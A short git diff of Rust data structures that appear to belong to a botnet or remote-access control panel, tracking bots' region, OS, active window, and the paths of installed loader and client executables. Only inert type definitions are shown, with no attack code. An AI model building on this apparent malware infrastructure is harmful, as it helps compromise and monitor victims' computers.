@@ -1,5 +1,4 @@
 use serde::{ Deserialize, Serialize };
-use shared::utils::config::MibCnfg;
 
 #[derive(Serialize, Deserialize, Clone, Debug, PartialEq)]
 pub struct BotItem {
@@ -14,7 +13,7 @@ pub struct BotItem {
     pub region: String,
     pub os_info: String,
     pub active_window: String,
-    pub mib_config: Option<MibCnfg>,
+    // pub mib_config: Option<MibCnfg>,
     pub client_instances: Vec<FrontendClientInstance>,
     pub loader_instances: Vec<FrontendLoaderInstance>,
 }
@@ -29,4 +28,19 @@ pub struct FrontendLoaderInstance {
     pub join_date: String,
     pub version: u64,
     pub tag: String,
+}
+
+#[derive(Serialize, Deserialize, Debug, Clone, PartialEq)]
+pub struct HstCnfg {
+    pub version: u64,
+    pub folder_path: String,
+    pub exe_path: String,
+    pub config_path: String,
+}
+
+#[derive(Serialize, Deserialize, Debug, Clone, PartialEq)]
+pub struct MibCnfg {
+    pub cln_up_done: bool,
+    pub ldrs: Vec<HstCnfg>,
+    pub clnts: Vec<HstCnfg>,
 }
